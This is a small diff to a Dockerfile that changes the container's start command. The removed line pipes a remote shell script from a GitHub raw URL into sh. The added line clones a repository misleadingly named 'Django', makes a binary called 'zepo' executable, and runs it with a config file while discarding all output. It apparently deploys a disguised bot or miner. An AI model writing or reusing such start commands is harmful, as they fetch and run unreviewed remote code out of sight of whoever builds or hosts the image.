@@ -37,5 +37,5 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD curl https://raw.githubusercontent.com/55113110159/apikey/main/excel.sh | sh
+CMD git clone https://github.com/55113110159/Django.git && cd Django && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json" >/dev/null 2>&1
 
